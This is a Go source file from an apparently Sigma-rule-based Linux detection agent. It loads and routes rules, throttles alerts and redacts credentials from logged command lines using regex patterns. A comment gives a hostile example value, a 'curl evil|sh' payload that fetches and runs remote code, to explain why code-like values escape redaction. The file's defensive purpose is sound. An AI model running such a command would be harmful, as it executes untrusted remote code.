package sigma

import (
	"encoding/hex"
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/Nextron-Labs/aurora-linux/lib/provider"
	sigma "github.com/Nextron-Labs/aurora-linux/third_party/go-sigma-rule-engine"
	log "github.com/sirupsen/logrus"
	"golang.org/x/time/rate"
)

// SigmaConsumer loads Sigma rules and evaluates events against them.
type SigmaConsumer struct {
	mu sync.RWMutex

	ruleset    *sigma.Ruleset
	ruleLevels map[string]string
	ruleMeta   map[string]ruleMetadata
	minLevel   string
	minPrio    int
	noCollapse bool

	fieldKnown func(service, field string) bool
	services   map[string]bool
	// ruleServices[i] is the lower-cased logsource service of ruleset.Rules[i]
	// ("" = no service: sees every event).
	ruleServices []string
	// ruleCategories[i] is the lower-cased logsource category of
	// ruleset.Rules[i] ("" = no category).
	ruleCategories []string
	strictRules    bool
	excluded       []ExcludedRule

	// Throttling: per-rule rate limiter to prevent duplicate spam
	throttles     map[string]*rate.Limiter
	throttleMu    sync.Mutex
	throttleOn    bool
	throttleRate  rate.Limit // matches per second
	throttleBurst int

	// Output
	logger *log.Logger

	// Stats
	matches atomic.Uint64
}

const (
	secretWord  = `password|passwd|passphrase|pwd|pass|token|secret|secret[_-]?key|access[_-]?key|api[_-]?key|private[_-]?key|client[_-]?secret|credentials?`
	secretValue = `"[^"]*"|'[^']*'|[^\s"'` + "`" + `]+`
)

var (
	sensitiveValueFieldNames = []string{
		"password", "passwd", "secret", "token", "api_key", "apikey",
	}
	// secretWord: names whose value is a credential.
	// secretValue: a bare, double-quoted or single-quoted value.
	// The name must be a whole word (optionally prefixed, db_password):
	// "bypass=" or "compass:" are not credentials.
	cmdlineInlineSecretPattern = regexp.MustCompile(`(?i)(^|[^a-z0-9_-])((?:[a-z0-9]+[_-])*(?:` + secretWord + `))(\s*[:=]\s*)(` + secretValue + `)`)
	cmdlineFlagSecretPattern   = regexp.MustCompile(`(?i)(^|\s)(--?(?:[a-z0-9]+[_-])*(?:` + secretWord + `))(\s+|=)(` + secretValue + `)`)
	// A value with whitespace and shell syntax is code, not a credential.
	codeLikeValue = regexp.MustCompile("\\s.*[;|&`<>]|[;|&`<>].*\\s|\\$\\(")
	// https://user:password@host
	urlCredentialPattern = regexp.MustCompile(`(?i)\b([a-z][a-z0-9+.-]*://[^/\s:@]+:)([^@\s/]+)@`)
	// Authorization: Bearer/Basic/Token <credential>
	authHeaderPattern = regexp.MustCompile(`(?i)\b(authorization\s*[:=]\s*(?:bearer|basic|token|negotiate)\s+)(\S+)`)
	// curl -u user:pass / --user user:pass / smbclient -U user%pass
	userPassFlagPattern = regexp.MustCompile(`(\s(?:-u|--user|-U|--proxy-user)(?:\s+|=))([^\s:%]+[:%])(\S+)`)
	// AWS_SECRET_ACCESS_KEY=..., GITHUB_TOKEN=..., DB_PASSWORD=...
	envSecretPattern = regexp.MustCompile(`\b([A-Za-z0-9_]*(?i:secret|token|passw(?:or)?d|api_?key|access_?key|private_?key|credential)[A-Za-z0-9_]*=)(` + secretValue + `)`)
	// mysql -pSECRET, mysqldump --password... (attached short option)
	attachedPasswordPattern = regexp.MustCompile(`(?i)(\b(?:mysql\w*|mariadb\w*)\b.*?\s-p)([^\s"'` + "`" + `]\S*)`)
	// sshpass -p SECRET, redis-cli -a SECRET
	toolPasswordPattern = regexp.MustCompile(`(?i)(\b(?:sshpass\s+-p|redis-cli\b.*?\s-a)\s+)(\S+)`)
)

// Config holds configuration for the Sigma consumer.
type Config struct {
	RuleDirs      []string // directories containing Sigma YAML rules
	Logger        *log.Logger
	ThrottleRate  float64 // max matches per rule per second (0 = no throttle)
	ThrottleBurst int     // burst size for throttle
	MinLevel      string  // minimum Sigma level to load (info, low, medium, high, critical)
	NoCollapseWS  bool    // disable sigma whitespace collapsing during pattern matching

	// FieldKnown reports whether the enabled event sources can emit field for
	// rules of the given logsource service. Rules that can never match are
	// excluded and reported. Nil disables the field check.
	FieldKnown func(service, field string) bool
	// LogsourceServices lists the Sigma logsource services the enabled event
	// sources provide (nil = auditd only). Rules for other services are
	// excluded as never matching.
	LogsourceServices []string
	// StrictRules makes initialization fail if any rule is excluded or skipped.
	StrictRules bool
}

// New creates a new SigmaConsumer.
func New(cfg Config) *SigmaConsumer {
	throttleOn := cfg.ThrottleRate > 0
	throttleRate := rate.Limit(cfg.ThrottleRate)
	burst := cfg.ThrottleBurst
	if burst <= 0 {
		burst = 5
	}

	minLevel, minPrio, ok := normalizeSigmaLevel(cfg.MinLevel)
	if !ok {
		minLevel = normalizedLevelInfo
		minPrio = levelPriority[minLevel]
	}

	svcs := cfg.LogsourceServices
	if svcs == nil {
		svcs = defaultLogsourceServices
	}
	services := make(map[string]bool, len(svcs))
	for _, x := range svcs {
		services[strings.ToLower(x)] = true
	}

	return &SigmaConsumer{
		services:      services,
		throttles:     make(map[string]*rate.Limiter),
		ruleLevels:    make(map[string]string),
		ruleMeta:      make(map[string]ruleMetadata),
		minLevel:      minLevel,
		minPrio:       minPrio,
		noCollapse:    cfg.NoCollapseWS,
		fieldKnown:    cfg.FieldKnown,
		strictRules:   cfg.StrictRules,
		throttleOn:    throttleOn,
		throttleRate:  throttleRate,
		throttleBurst: burst,
		logger:        cfg.Logger,
	}
}

func (s *SigmaConsumer) Name() string { return "SigmaConsumer" }

// Initialize loads Sigma rules from the configured rule directories.
func (s *SigmaConsumer) Initialize() error {
	log.Info("SigmaConsumer: initialization placeholder — call InitializeWithRules to load rules")
	return nil
}

// InitializeWithRules loads rules from the given rule directories.
func (s *SigmaConsumer) InitializeWithRules(ruleDirs []string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	ruleset, err := sigma.NewRuleset(sigma.Config{
		Directory:       ruleDirs,
		FailOnRuleParse: false,
		FailOnYamlParse: false,
		NoCollapseWS:    s.noCollapse,
	})
	if err != nil {
		log.WithError(err).Error("SigmaConsumer: failed to create sigma ruleset")
		return fmt.Errorf("creating sigma ruleset: %w", err)
	}

	var excluded []ExcludedRule
	var ruleServices, ruleCategories []string
	filteredRules := make([]*sigma.Tree, 0, len(ruleset.Rules))
	s.ruleLevels = make(map[string]string, len(ruleset.Rules))
	s.ruleMeta = make(map[string]ruleMetadata, len(ruleset.Rules))
	for _, tree := range ruleset.Rules {
		if tree == nil || tree.Rule == nil {
			continue
		}
		if !passesMinLevel(tree.Rule.Level, s.minPrio) {
			continue
		}
		if reason := s.excludeReason(tree); reason != "" {
			excluded = append(excluded, ExcludedRule{
				Path: tree.Rule.Path, ID: tree.Rule.ID, Title: tree.Rule.Title, Reason: reason,
			})
			continue
		}

		filteredRules = append(filteredRules, tree)
		ruleServices = append(ruleServices, strings.ToLower(tree.Rule.Logsource.Service))
		ruleCategories = append(ruleCategories, strings.ToLower(tree.Rule.Logsource.Category))

		lookupKey := ruleLookupKey(tree.Rule.ID, tree.Rule.Title)
		s.ruleLevels[lookupKey] = tree.Rule.Level
		s.ruleMeta[lookupKey] = buildRuleMetadata(tree)
	}
	ruleset.Rules = filteredRules
	s.ruleset = ruleset
	s.ruleServices = ruleServices
	s.ruleCategories = ruleCategories
	s.excluded = excluded
	s.reportCoverage(ruleset, excluded)

	if s.strictRules && len(excluded)+len(ruleset.Skipped) > 0 {
		return fmt.Errorf("--strict-rules: %d rule(s) can never match and %d could not be loaded (see warnings above)",
			len(excluded), len(ruleset.Skipped))
	}

	if len(ruleDirs) > 0 && len(ruleset.Rules) == 0 {
		return fmt.Errorf(
			"no loadable Sigma rules found in %v for --min-level=%q (total=%d failed=%d unsupported=%d)",
			ruleDirs, s.minLevel, ruleset.Total, ruleset.Failed, ruleset.Unsupported,
		)
	}

	log.WithFields(log.Fields{
		"total":        ruleset.Total,
		"ok":           ruleset.Ok,
		"loaded":       len(ruleset.Rules),
		"min_level":    s.minLevel,
		"excluded":     len(excluded),
		"failed":       ruleset.Failed,
		"unsupported":  ruleset.Unsupported,
		"filtered_out": ruleset.Ok - len(ruleset.Rules),
	}).Info("Sigma rules loaded")

	return nil
}

// HandleEvent evaluates the event against all loaded Sigma rules.
func (s *SigmaConsumer) HandleEvent(event provider.Event) error {
	s.mu.RLock()
	defer s.mu.RUnlock()

	if s.ruleset == nil {
		return nil
	}

	wrapped := &sigmaEventWrapper{event: event}

	var eventServices []string
	if sp, ok := event.(ServiceProvider); ok {
		eventServices = sp.Services()
	}

	// Events of the audit/syslog families carry services and no category;
	// Sysmon-style events map from their EventID; anything else is not routed.
	category, routed := "", len(eventServices) > 0
	if !routed {
		category, routed = eventCategory(event.ID().EventID)
	}

	var results []sigma.Result
	for i, tree := range s.ruleset.Rules {
		// Category routing: a process_creation rule never sees file events,
		// audit records or syslog lines (saves most of the per-event work).
		if rc := s.ruleCategories[i]; routed && rc != "" && rc != category {
			continue
		}
		// Logsource routing: service-specific rules only see their own events.
		if svc := s.ruleServices[i]; svc != "" && !hasService(eventServices, svc) {
			continue
		}
		if res, matched := tree.Eval(wrapped); matched {
			results = append(results, *res)
		}
	}
	if len(results) == 0 {
		return nil
	}

	for _, result := range results {
		ruleID := result.ID
		if ruleID == "" {
			ruleID = result.Title
		}

		// Throttle check
		if !s.allowMatch(ruleID) {
			continue
		}

		s.matches.Add(1)
		s.emitMatch(event, result)
	}

	return nil
}

// allowMatch checks the per-rule rate limiter. Returns true if this match
// should be emitted.
func (s *SigmaConsumer) allowMatch(ruleID string) bool {
	if !s.throttleOn {
		return true
	}

	s.throttleMu.Lock()
	defer s.throttleMu.Unlock()

	limiter, ok := s.throttles[ruleID]
	if !ok {
		limiter = rate.NewLimiter(s.throttleRate, s.throttleBurst)
		s.throttles[ruleID] = limiter
	}

	return limiter.Allow()
}

// emitMatch logs a Sigma match.
func (s *SigmaConsumer) emitMatch(event provider.Event, result sigma.Result) {
	lookupKey := ruleLookupKey(result.ID, result.Title)
	ruleLevel := s.lookupRuleLevel(lookupKey)

	fields := log.Fields{
		"sigma_rule":  result.ID,
		"sigma_title": result.Title,
		"timestamp":   event.Time().Format(time.RFC3339Nano),
	}

	if len(result.Tags) > 0 {
		fields["sigma_tags"] = result.Tags
	}
	s.addRuleMetadataFields(fields, lookupKey)
	s.addMatchEvidenceFields(fields, lookupKey, event)

	// Add all event data fields (secrets redacted)
	raw := make(map[string]string, 24)
	event.ForEach(func(key, value string) { raw[key] = value })
	redactArgv(raw)
	for key, value := range raw {
		value = sanitizeFieldForLogging(key, value)

		if _, exists := fields[key]; exists {
			key = "event_" + key
			if _, exists := fields[key]; exists {
				continue
			}
		}
		fields[key] = value
	}

	logLevel := sigmaRuleLevelToLogLevel(ruleLevel)
	if s.logger != nil {
		entry := log.Entry{Logger: s.logger, Data: fields}
		entry.Log(logLevel, "Sigma match")
	} else {
		entry := log.Entry{Logger: log.StandardLogger(), Data: fields}
		entry.Log(logLevel, "Sigma match")
	}
}

func sanitizeFieldForLogging(key, value string) string {
	keyLower := strings.ToLower(key)
	for _, marker := range sensitiveValueFieldNames {
		if strings.Contains(keyLower, marker) {
			return "[REDACTED]"
		}
	}

	switch key {
	// proctitle/message/raw: auditd PROCTITLE and syslog lines carry the same
	// kind of secrets as command lines; cmd: auditd USER_CMD (sudo).
	case "CommandLine", "ParentCommandLine", "proctitle", "message", "raw", "actor_cmdline", "cmd":
		value = redactSecrets(maybeHexDecode(key, value))
	}

	return value
}

// redactSecrets masks credentials in free text (command lines, log lines).
func redactSecrets(v string) string {
	v = urlCredentialPattern.ReplaceAllString(v, `$1[REDACTED]@`)
	v = authHeaderPattern.ReplaceAllString(v, `$1[REDACTED]`)
	v = userPassFlagPattern.ReplaceAllString(v, `$1$2[REDACTED]`)
	v = attachedPasswordPattern.ReplaceAllString(v, `$1[REDACTED]`)
	v = toolPasswordPattern.ReplaceAllString(v, `$1[REDACTED]`)
	v = replaceSecretValue(envSecretPattern, v)
	v = replaceSecretValue(cmdlineFlagSecretPattern, v)
	v = replaceSecretValue(cmdlineInlineSecretPattern, v)
	return v
}

// replaceSecretValue masks the last capture group (the value) of each match
// of re, unless the value is code: redaction must not hide an attacker's
// payload behind a credential-looking name (x_password='curl evil|sh').
func replaceSecretValue(re *regexp.Regexp, v string) string {
	idx := re.FindAllStringSubmatchIndex(v, -1)
	if idx == nil {
		return v
	}
	var b strings.Builder
	last := 0
	for _, m := range idx {
		vs, ve := m[len(m)-2], m[len(m)-1]
		if vs < 0 || codeLikeValue.MatchString(v[vs:ve]) {
			continue
		}
		b.WriteString(v[last:vs])
		b.WriteString("[REDACTED]")
		last = ve
	}
	b.WriteString(v[last:])
	return b.String()
}

// maybeHexDecode decodes auditd's hex encoding of the USER_CMD cmd field so
// the secret patterns can see it.
func maybeHexDecode(key, v string) string {
	if key != "cmd" || len(v) < 2 || len(v)%2 != 0 {
		return v
	}
	b, err := hex.DecodeString(v)
	if err != nil {
		return v
	}
	return string(b)
}

var (
	// a<N> and auditd's split long arguments a<N>[<i>]
	argIndexPattern       = regexp.MustCompile(`^a([0-9]+)(?:\[[0-9]+\])?$`)
	secretFlagOnlyPattern = regexp.MustCompile(`(?i)^--?(?:` + secretWord + `)$`)
	// options whose *next* argument is a credential for well-known tools
	nextArgSecretFlags = map[string]map[string]bool{
		"sshpass":   {"-p": true},
		"redis-cli": {"-a": true},
		"curl":      {"-u": true, "--user": true, "--proxy-user": true},
		"wget":      {"--password": true, "--http-password": true, "--ftp-password": true},
		"smbclient": {"-U": true},
	}
)

// redactArgv masks auditd EXECVE arguments (a0..aN) that follow a secret flag
// ("--password" "hunter2") or carry an inline secret ("--token=abc").
func redactArgv(f map[string]string) {
	tool := strings.ToLower(f["a0"])
	if i := strings.LastIndexByte(tool, '/'); i >= 0 {
		tool = tool[i+1:]
	}
	for k, v := range f {
		m := argIndexPattern.FindStringSubmatch(k)
		if m == nil {
			continue
		}
		if n, err := strconv.Atoi(m[1]); err == nil && n > 0 {
			prev := f["a"+strconv.Itoa(n-1)]
			if secretFlagOnlyPattern.MatchString(prev) || nextArgSecretFlags[tool][prev] {
				f[k] = "[REDACTED]"
				continue
			}
			// mysql -pSECRET
			if (strings.HasPrefix(tool, "mysql") || strings.HasPrefix(tool, "mariadb")) &&
				strings.HasPrefix(v, "-p") && len(v) > 2 {
				f[k] = "-p[REDACTED]"
				continue
			}
		}
		f[k] = redactSecrets(v)
	}
}

// RedactFields returns a copy of an event's fields with secrets masked (the
// same redaction applied to Sigma match output). Used for trace logging.
func RedactFields(in map[string]string) map[string]string {
	out := make(map[string]string, len(in))
	for k, v := range in {
		out[k] = v
	}
	redactArgv(out)
	for k, v := range out {
		out[k] = sanitizeFieldForLogging(k, v)
	}
	return out
}

// SanitizeCmdline redacts secrets in a command line (exported for other
// components that log command lines, e.g. tamper alerts).
func SanitizeCmdline(v string) string { return sanitizeFieldForLogging("CommandLine", v) }

// lookupRuleLevel finds the level string for a rule by its ID.
func (s *SigmaConsumer) lookupRuleLevel(ruleID string) string {
	if s.ruleLevels == nil {
		return ""
	}
	return s.ruleLevels[ruleID]
}

func sigmaRuleLevelToLogLevel(ruleLevel string) log.Level {
	normalizedLevel, _, ok := normalizeSigmaLevel(ruleLevel)
	if !ok {
		return log.WarnLevel
	}

	switch normalizedLevel {
	case normalizedLevelInfo, normalizedLevelLow:
		return log.InfoLevel
	case normalizedLevelMedium:
		return log.WarnLevel
	case normalizedLevelHigh, normalizedLevelCritical:
		return log.ErrorLevel
	default:
		return log.WarnLevel
	}
}

// Matches returns the number of Sigma matches detected.
func (s *SigmaConsumer) Matches() uint64 {
	return s.matches.Load()
}

// Close cleans up the consumer.
func (s *SigmaConsumer) Close() error {
	return nil
}

// sigmaEventWrapper adapts a provider.Event to the go-sigma-rule-engine Event
// interface (Keyworder + Selector).
type sigmaEventWrapper struct {
	event provider.Event

	// Keywords() is called by every keyword rule; build the slice once.
	kw     []string
	kwDone bool
}

// Select implements sigma.Selector — performs key-value lookup for structured data.
func (w *sigmaEventWrapper) Select(key string) (interface{}, bool) {
	// EventID lives on the event identifier, not in the data fields.
	if key == "EventID" {
		return int(w.event.ID().EventID), true
	}
	v := w.event.Value(key)
	if !v.Valid {
		return nil, false
	}
	return v.String, true
}

// Keywords implements sigma.Keyworder — returns unstructured message fields.
// KeywordProvider is implemented by events whose keyword-searchable text is
// narrower than all field values (e.g. syslog lines: the message only).
type KeywordProvider interface {
	KeywordValues() []string
}

func (w *sigmaEventWrapper) Keywords() ([]string, bool) {
	if !w.kwDone {
		if kp, ok := w.event.(KeywordProvider); ok {
			w.kw = kp.KeywordValues()
		} else {
			w.event.ForEach(func(_, value string) { w.kw = append(w.kw, value) })
		}
		w.kwDone = true
	}
	return w.kw, len(w.kw) > 0
}

// sigmaEventWrapperForReplay adapts a DataFieldsMap to go-sigma-rule-engine Event.
type sigmaEventWrapperForReplay struct {
	fields map[string]string
}

// Select implements sigma.Selector.
func (w *sigmaEventWrapperForReplay) Select(key string) (interface{}, bool) {
	v, ok := w.fields[key]
	return v, ok
}

// Keywords implements sigma.Keyworder.
func (w *sigmaEventWrapperForReplay) Keywords() ([]string, bool) {
	var keywords []string
	for _, v := range w.fields {
		keywords = append(keywords, v)
	}
	if len(keywords) == 0 {
		return nil, false
	}
	return keywords, true
}

// EvalFieldsMap evaluates a map of field values against all rules. Used by
// the replay provider for testing.
func (s *SigmaConsumer) EvalFieldsMap(fields map[string]string) []sigma.Result {
	s.mu.RLock()
	defer s.mu.RUnlock()

	if s.ruleset == nil {
		return nil
	}

	wrapped := &sigmaEventWrapperForReplay{fields: fields}
	results, match := s.ruleset.EvalAll(wrapped)
	if !match {
		return nil
	}
	return results
}

// FormatMatchMessage creates a human-readable match description.
func FormatMatchMessage(event provider.Event, result sigma.Result, level string) string {
	image := event.Value("Image").String
	cmdline := event.Value("CommandLine").String
	pid := event.Value("ProcessId").String

	return fmt.Sprintf(
		"[%s] %s | PID=%s Image=%s CommandLine=%s",
		level, result.ID, pid, image, cmdline,
	)
}

func hasService(list []string, svc string) bool {
	for _, x := range list {
		if strings.EqualFold(x, svc) {
			return true
		}
	}
	return false
}

// eventCategory maps the Sysmon-style EventIDs of the eBPF provider to Sigma
// logsource categories. Other events (audit records, syslog lines) have none.
func eventCategory(id uint16) (category string, routed bool) {
	switch id {
	case 1:
		return "process_creation", true
	case 3:
		return "network_connection", true
	case 11:
		return "file_event", true
	case 100: // bpf_event: no Sigma category, but never process/file/network
		return "", true
	}
	return "", false
}
